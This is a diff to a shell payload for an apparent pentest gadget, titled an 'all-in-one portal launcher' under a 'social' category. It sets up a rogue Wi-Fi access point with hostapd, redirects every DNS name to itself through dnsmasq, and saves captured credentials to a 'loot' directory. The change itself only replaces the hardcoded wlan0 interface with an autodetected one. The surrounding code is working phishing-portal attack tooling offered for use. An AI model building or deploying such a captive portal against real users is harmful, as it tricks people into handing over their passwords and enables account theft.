@@ -4,6 +4,11 @@
 # Description: All-in-one portal launcher with 15+ templates
 # Category: nullsec/social
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 LOOT_DIR="/mmc/nullsec/creds"
 mkdir -p "$LOOT_DIR"
 
@@ -18,8 +23,6 @@ demographic and deploy!
 by bad-antics
 
 Press OK to configure."
-
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
 
 PROMPT "PORTAL CATEGORIES:
 
@@ -317,7 +320,7 @@ SUCCESSHTML
 LOG "Starting Portal Master..."
 
 cat > /tmp/pm_hostapd.conf << EOF
-interface=wlan0
+interface=$IFACE
 driver=nl80211
 ssid=$SSID
 hw_mode=g
@@ -328,10 +331,10 @@ EOF
 
 hostapd /tmp/pm_hostapd.conf &
 sleep 2
-ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up
+ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up
 
 cat > /tmp/pm_dns.conf << EOF
-interface=wlan0
+interface=$IFACE
 dhcp-range=10.0.0.10,10.0.0.200,5m
 address=/#/10.0.0.1
 EOF
